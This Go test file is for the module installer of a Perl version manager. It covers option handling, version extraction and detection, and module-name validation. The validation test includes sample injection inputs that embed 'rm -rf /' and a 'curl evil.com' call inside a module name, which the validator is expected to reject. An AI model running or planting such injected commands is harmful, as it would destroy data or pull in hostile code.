// ABOUTME: Tests for unified module installer
// ABOUTME: Validates module installation functionality and helper functions

package modules

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"

	"tamarou.com/pvm/internal/cli/progress"
	"tamarou.com/pvm/internal/cpan"
	"tamarou.com/pvm/internal/log"
	"tamarou.com/pvm/internal/pvi/deps"
)

// mockTracker implements progress.Tracker for testing
type mockTracker struct {
	started     bool
	finished    bool
	updates     []string
	lastResult  *progress.Result
	lastTotal   int
	lastCurrent int
}

func (m *mockTracker) Start(operation string, total int) {
	m.started = true
	m.lastTotal = total
}

func (m *mockTracker) Update(current int, message string) {
	m.lastCurrent = current
	m.updates = append(m.updates, message)
}

func (m *mockTracker) Finish(result *progress.Result) {
	m.finished = true
	m.lastResult = result
}

func (m *mockTracker) SetTotal(total int) {
	m.lastTotal = total
}

func (m *mockTracker) SetMessage(message string) {
	m.updates = append(m.updates, message)
}

func (m *mockTracker) IsRunning() bool {
	return m.started && !m.finished
}

func (m *mockTracker) GetProgress() *progress.Status {
	return &progress.Status{
		Current: m.lastCurrent,
		Total:   m.lastTotal,
	}
}

// mockProvider implements cpan.Provider for testing
type mockProvider struct{}

func (m *mockProvider) GetModuleInfo(ctx context.Context, moduleName string) (*cpan.ModuleInfo, error) {
	return nil, nil
}

func (m *mockProvider) SearchModules(ctx context.Context, query string, limit int) (*cpan.SearchResults, error) {
	return nil, nil
}

func (m *mockProvider) GetDependencies(ctx context.Context, moduleName string) ([]*cpan.Dependency, error) {
	return nil, nil
}

func (m *mockProvider) GetModuleVersions(ctx context.Context, moduleName string) ([]string, error) {
	return nil, nil
}

func (m *mockProvider) GetAuthorInfo(ctx context.Context, authorID string) (map[string]interface{}, error) {
	return nil, nil
}

func (m *mockProvider) IsCoreModule(ctx context.Context, moduleName string, perlVersion string) (bool, error) {
	return false, nil
}

func (m *mockProvider) Name() string {
	return "mock"
}

func (m *mockProvider) BaseURL() string {
	return "http://mock.test"
}

func TestNewInstaller(t *testing.T) {
	provider := &mockProvider{}
	resolver := deps.NewDependencyResolver()
	tracker := &mockTracker{}
	logger := log.NewLogger(log.LevelInfo, os.Stderr, "test")

	installer := NewInstaller(provider, resolver, tracker, logger)

	if installer.provider == nil {
		t.Error("Expected provider to be set")
	}
	if installer.resolver != resolver {
		t.Error("Expected resolver to be set correctly")
	}
	if installer.tracker != tracker {
		t.Error("Expected tracker to be set correctly")
	}
	if installer.logger != logger {
		t.Error("Expected logger to be set correctly")
	}
}

func TestResolvePerlPath(t *testing.T) {
	// Test with provided path
	provided := "/usr/bin/perl"
	result, err := ResolvePerlPath(provided)
	if err != nil {
		t.Errorf("Expected no error with provided path, got: %v", err)
	}
	if result != provided {
		t.Errorf("Expected %q, got %q", provided, result)
	}

	// Test with empty path - this will use system resolution
	// We can't guarantee this will work in all test environments,
	// so we'll just check it doesn't panic
	_, err = ResolvePerlPath("")
	// Don't fail the test if perl is not available in test environment
	if err != nil {
		t.Logf("Perl path resolution failed (expected in test environment): %v", err)
	}
}

func TestCreateInstallOptions(t *testing.T) {
	module := "DBI"
	version := "1.643"
	perlPath := "/usr/bin/perl"
	installDir := "/opt/perl"
	skipTests := true
	force := false
	verbose := true
	skipDeps := false
	provider := &mockProvider{}
	resolver := deps.NewDependencyResolver()
	ctx := context.Background()

	opts := CreateInstallOptions(
		module, version, perlPath, installDir,
		skipTests, force, verbose, skipDeps,
		provider, resolver, nil, ctx,
	)

	if opts.ModuleName != module {
		t.Errorf("Expected module name %q, got %q", module, opts.ModuleName)
	}
	if opts.VersionConstraint != version {
		t.Errorf("Expected version %q, got %q", version, opts.VersionConstraint)
	}
	if opts.PerlPath != perlPath {
		t.Errorf("Expected perl path %q, got %q", perlPath, opts.PerlPath)
	}
	if opts.InstallDir != installDir {
		t.Errorf("Expected install dir %q, got %q", installDir, opts.InstallDir)
	}
	if opts.RunTests != !skipTests {
		t.Errorf("Expected RunTests %t, got %t", !skipTests, opts.RunTests)
	}
	if opts.Force != force {
		t.Errorf("Expected Force %t, got %t", force, opts.Force)
	}
	if opts.Verbose != verbose {
		t.Errorf("Expected Verbose %t, got %t", verbose, opts.Verbose)
	}
	if opts.SkipDependencies != skipDeps {
		t.Errorf("Expected SkipDependencies %t, got %t", skipDeps, opts.SkipDependencies)
	}
	if !opts.Cleanup {
		t.Error("Expected Cleanup to be true by default")
	}
	if opts.Context != ctx {
		t.Error("Expected context to be set correctly")
	}
}

func TestInstallationEnvironment(t *testing.T) {
	provider := &mockProvider{}
	resolver := deps.NewDependencyResolver()

	env := &InstallationEnvironment{
		Provider: provider,
		Resolver: resolver,
	}

	if env.Provider == nil {
		t.Error("Expected provider to be set")
	}
	if env.Resolver != resolver {
		t.Error("Expected resolver to be set correctly")
	}
}

func TestInstaller_InstallBatch_EmptyList(t *testing.T) {
	provider := &mockProvider{}
	resolver := deps.NewDependencyResolver()
	tracker := &mockTracker{}
	logger := log.NewLogger(log.LevelInfo, os.Stderr, "test")

	installer := NewInstaller(provider, resolver, tracker, logger)

	ctx := context.Background()
	opts := InstallOptions{
		PerlPath: "/usr/bin/perl",
		Context:  ctx,
	}

	results, err := installer.InstallBatch(ctx, []string{}, opts)
	if err != nil {
		t.Errorf("Expected no error for empty list, got: %v", err)
	}
	if len(results) != 0 {
		t.Errorf("Expected empty results, got %d results", len(results))
	}
}

func TestMockTracker_Interface(t *testing.T) {
	// Verify mockTracker implements progress.Tracker interface
	var _ progress.Tracker = &mockTracker{}

	tracker := &mockTracker{}

	// Test Start
	tracker.Start("test", 10)
	if !tracker.started {
		t.Error("Expected tracker to be started")
	}
	if tracker.lastTotal != 10 {
		t.Errorf("Expected total 10, got %d", tracker.lastTotal)
	}

	// Test Update
	tracker.Update(5, "halfway")
	if tracker.lastCurrent != 5 {
		t.Errorf("Expected current 5, got %d", tracker.lastCurrent)
	}
	if len(tracker.updates) != 1 || tracker.updates[0] != "halfway" {
		t.Errorf("Expected update message 'halfway', got %v", tracker.updates)
	}

	// Test IsRunning
	if !tracker.IsRunning() {
		t.Error("Expected tracker to be running")
	}

	// Test Finish
	result := &progress.Result{Success: true}
	tracker.Finish(result)
	if !tracker.finished {
		t.Error("Expected tracker to be finished")
	}
	if tracker.lastResult != result {
		t.Error("Expected result to be stored")
	}

	// Test IsRunning after finish
	if tracker.IsRunning() {
		t.Error("Expected tracker to not be running after finish")
	}

	// Test GetProgress
	status := tracker.GetProgress()
	if status.Current != 5 {
		t.Errorf("Expected progress current 5, got %d", status.Current)
	}
	if status.Total != 10 {
		t.Errorf("Expected progress total 10, got %d", status.Total)
	}
}

func TestInstaller_ConvertInstallOptions(t *testing.T) {
	provider := &mockProvider{}
	resolver := deps.NewDependencyResolver()
	tracker := &mockTracker{}
	logger := log.NewLogger(log.LevelInfo, os.Stderr, "test")

	installer := NewInstaller(provider, resolver, tracker, logger)

	opts := InstallOptions{
		PerlPath:          "/usr/bin/perl",
		VersionConstraint: "1.0",
		InstallDir:        "/opt/perl",
		Force:             true,
		RunTests:          false,
		SkipDependencies:  true,
		Verbose:           true,
		Cleanup:           true,
		Context:           context.Background(),
	}

	pviOpts, err := installer.convertInstallOptions("TestModule", opts)
	if err != nil {
		t.Errorf("Expected no error, got: %v", err)
	}

	if pviOpts.ModuleName != "TestModule" {
		t.Errorf("Expected module name 'TestModule', got %q", pviOpts.ModuleName)
	}
	if pviOpts.VersionConstraint != "1.0" {
		t.Errorf("Expected version constraint '1.0', got %q", pviOpts.VersionConstraint)
	}
	if pviOpts.PerlPath != "/usr/bin/perl" {
		t.Errorf("Expected perl path '/usr/bin/perl', got %q", pviOpts.PerlPath)
	}
	if pviOpts.InstallDir != "/opt/perl" {
		t.Errorf("Expected install dir '/opt/perl', got %q", pviOpts.InstallDir)
	}
	if pviOpts.Force != true {
		t.Errorf("Expected Force true, got %t", pviOpts.Force)
	}
	if pviOpts.RunTests != false {
		t.Errorf("Expected RunTests false, got %t", pviOpts.RunTests)
	}
	if pviOpts.SkipDependencies != true {
		t.Errorf("Expected SkipDependencies true, got %t", pviOpts.SkipDependencies)
	}
	if pviOpts.Verbose != true {
		t.Errorf("Expected Verbose true, got %t", pviOpts.Verbose)
	}
	if !pviOpts.Cleanup { // Note: Cleanup is always set to true in convertInstallOptions
		t.Errorf("Expected Cleanup true, got %t", pviOpts.Cleanup)
	}
}

// createTestInstaller creates an installer instance for testing
func createTestInstaller() *Installer {
	provider := &mockProvider{}
	resolver := deps.NewDependencyResolver()
	tracker := &mockTracker{}
	logger := log.NewLogger(log.LevelInfo, os.Stderr, "test")
	return NewInstaller(provider, resolver, tracker, logger)
}

// TestExtractVersionFromContent tests version extraction from Perl module content
func TestExtractVersionFromContent(t *testing.T) {
	installer := createTestInstaller()

	tests := []struct {
		name     string
		content  string
		expected string
		hasError bool
	}{
		{
			name:     "quoted version",
			content:  `our $VERSION = "1.23";`,
			expected: "1.23",
			hasError: false,
		},
		{
			name:     "single quoted version",
			content:  `our $VERSION = '2.45';`,
			expected: "2.45",
			hasError: false,
		},
		{
			name:     "unquoted numeric version",
			content:  `our $VERSION = 3.14;`,
			expected: "3.14",
			hasError: false,
		},
		{
			name:     "version->declare usage",
			content:  `our $VERSION = version->declare("v1.2.3");`,
			expected: "v1.2.3",
			hasError: false,
		},
		{
			name:     "version->parse usage",
			content:  `our $VERSION = version->parse("4.56");`,
			expected: "4.56",
			hasError: false,
		},
		{
			name:     "multiline with indentation",
			content:  "package MyModule;\n\nour $VERSION = \"0.42\";\n\nsub new {\n",
			expected: "0.42",
			hasError: false,
		},
		{
			name:     "no version found",
			content:  `package MyModule;\nsub new { return bless {}, shift; }`,
			expected: "",
			hasError: true,
		},
		{
			name:     "without our keyword",
			content:  `$VERSION = "1.0";`,
			expected: "1.0",
			hasError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := installer.extractVersionFromContent(tt.content)

			if tt.hasError && err == nil {
				t.Errorf("Expected error but got none")
			}
			if !tt.hasError && err != nil {
				t.Errorf("Unexpected error: %v", err)
			}
			if result != tt.expected {
				t.Errorf("Expected version %q, got %q", tt.expected, result)
			}
		})
	}
}

// TestValidateModuleName tests module name validation for security
func TestValidateModuleName(t *testing.T) {
	installer := createTestInstaller()

	tests := []struct {
		name     string
		module   string
		hasError bool
	}{
		{
			name:     "valid simple module",
			module:   "DBI",
			hasError: false,
		},
		{
			name:     "valid namespaced module",
			module:   "DBD::mysql",
			hasError: false,
		},
		{
			name:     "valid complex namespace",
			module:   "Some::Deep::Module::Name",
			hasError: false,
		},
		{
			name:     "valid underscore module",
			module:   "Test_Module",
			hasError: false,
		},
		{
			name:     "empty module name",
			module:   "",
			hasError: true,
		},
		{
			name:     "module with semicolon injection",
			module:   "DBI; system('rm -rf /'); #",
			hasError: true,
		},
		{
			name:     "module with eval injection",
			module:   "DBI} eval{system('curl evil.com')} #",
			hasError: true,
		},
		{
			name:     "module with backticks",
			module:   "DBI`rm -rf /`",
			hasError: true,
		},
		{
			name:     "module with dollar signs",
			module:   "DBI$VERSION",
			hasError: true,
		},
		{
			name:     "module starting with number",
			module:   "123Module",
			hasError: true,
		},
		{
			name:     "module with spaces",
			module:   "My Module",
			hasError: true,
		},
		{
			name:     "module with dots",
			module:   "My.Module",
			hasError: true,
		},
		{
			name:     "very long module name",
			module:   strings.Repeat("A", 300),
			hasError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := installer.validateModuleName(tt.module)

			if tt.hasError && err == nil {
				t.Errorf("Expected validation error for module %q but got none", tt.module)
			}
			if !tt.hasError && err != nil {
				t.Errorf("Unexpected validation error for module %q: %v", tt.module, err)
			}
		})
	}
}

// TestGetVersionFromPerl tests Perl command execution for version detection
func TestGetVersionFromPerl(t *testing.T) {
	installer := createTestInstaller()

	// Get a working Perl path for testing
	perlPath, err := getWorkingPerlPath()
	if err != nil {
		t.Skipf("No working Perl found for testing: %v", err)
	}

	tests := []struct {
		name     string
		module   string
		hasError bool
		skipTest bool
	}{
		{
			name:     "strict module (should be available in most Perl installations)",
			module:   "strict",
			hasError: false,
			skipTest: false,
		},
		{
			name:     "nonexistent module",
			module:   "NonExistentModule12345",
			hasError: true,
			skipTest: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.skipTest {
				t.Skip("Skipping test that requires specific module")
			}

			result, err := installer.getVersionFromPerl(tt.module, perlPath)

			if tt.hasError && err == nil {
				t.Errorf("Expected error but got none for module %s", tt.module)
			}
			if !tt.hasError && err != nil {
				// For core modules that might not have versions, this is acceptable
				if !strings.Contains(err.Error(), "has no version") {
					t.Errorf("Unexpected error for module %s: %v", tt.module, err)
				}
			}

			// If we got a result, it should be a reasonable version string
			if result != "" && !tt.hasError {
				// Version should not be empty or "undef"
				if result == "undef" {
					t.Errorf("Got 'undef' as version for module %s", tt.module)
				}
				t.Logf("Module %s version: %s", tt.module, result)
			}
		})
	}
}

// TestGetInstalledVersion tests the main version detection method
func TestGetInstalledVersion(t *testing.T) {
	installer := createTestInstaller()

	// Get a working Perl path for testing
	perlPath, err := getWorkingPerlPath()
	if err != nil {
		t.Skipf("No working Perl found for testing: %v", err)
	}

	tests := []struct {
		name     string
		module   string
		perlPath string
		skipTest bool
	}{
		{
			name:     "strict module with default perl",
			module:   "strict",
			perlPath: "",
			skipTest: false,
		},
		{
			name:     "nonexistent module should return undef",
			module:   "NonExistentModule12345",
			perlPath: "",
			skipTest: false,
		},
		{
			name:     "strict module with explicit perl path",
			module:   "strict",
			perlPath: perlPath,
			skipTest: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if tt.skipTest {
				t.Skip("Skipping test that requires specific setup")
			}

			result, err := installer.getInstalledVersion(tt.module, tt.perlPath)

			// The main method should never error - it should return "undef" for unknown versions
			if err != nil {
				t.Errorf("getInstalledVersion should not return errors, got: %v", err)
			}

			// Result should be either a version string or "undef"
			if result != "undef" && result != "" {
				// Should look like a version (contain digits and possibly dots)
				if !strings.ContainsAny(result, "0123456789") {
					t.Errorf("Version %q doesn't look like a valid version", result)
				}
				t.Logf("Module %s version: %s", tt.module, result)
			} else if result == "undef" {
				t.Logf("Module %s has no version (returned 'undef')", tt.module)
			}
		})
	}
}

// TestVersionDetectionIntegration tests version detection integration
func TestVersionDetectionIntegration(t *testing.T) {
	// Test that the main getInstalledVersion method works with a real installer
	installer := createTestInstaller()

	// Get a working Perl path for testing
	perlPath, err := getWorkingPerlPath()
	if err != nil {
		t.Skipf("No working Perl found for testing: %v", err)
	}

	t.Run("version detection integration", func(t *testing.T) {
		// Test with a core module that should be available
		result, err := installer.getInstalledVersion("strict", perlPath)

		// The main method should never error - it should return "undef" for unknown versions
		if err != nil {
			t.Errorf("getInstalledVersion should not return errors, got: %v", err)
		}

		// Result should be either a version string or "undef"
		if result != "undef" && result != "" {
			t.Logf("Module strict version: %s", result)
		} else if result == "undef" {
			t.Logf("Module strict has no version (returned 'undef')")
		}
	})
}

// getWorkingPerlPath returns a reliable perl path for testing, avoiding PVM shim issues
func getWorkingPerlPath() (string, error) {
	// First try to use perl from PATH (which should include PVM-managed Perl)
	if perlPath, err := exec.LookPath("perl"); err == nil {
		// Check if this is a PVM shim and resolve to actual Perl
		if strings.Contains(perlPath, "pvm/shims") {
			// For PVM shims, fall back to system Perl
			return resolveSystemPerlForModuleTest()
		}
		
		// Test it works and check version
		cmd := exec.Command(perlPath, "-v")
		if err := cmd.Run(); err == nil {
			return perlPath, nil
		}
	}

	// Fallback to standard system locations if PATH doesn't work
	return resolveSystemPerlForModuleTest()
}

// resolveSystemPerlForModuleTest finds the actual system Perl executable, bypassing any version managers
func resolveSystemPerlForModuleTest() (string, error) {
	// Common system Perl locations
	systemPaths := []string{
		"/usr/bin/perl",
		"/usr/local/bin/perl",
		"/opt/local/bin/perl",    // MacPorts
		"/opt/homebrew/bin/perl", // Homebrew on Apple Silicon
		"/usr/pkg/bin/perl",      // NetBSD pkgsrc
	}

	for _, path := range systemPaths {
		if _, err := os.Stat(path); err == nil {
			// Verify this perl works by checking version
			cmd := exec.Command(path, "-v")
			if err := cmd.Run(); err == nil {
				return path, nil
			}
		}
	}

	return "", fmt.Errorf("no working perl installation found for testing")
}
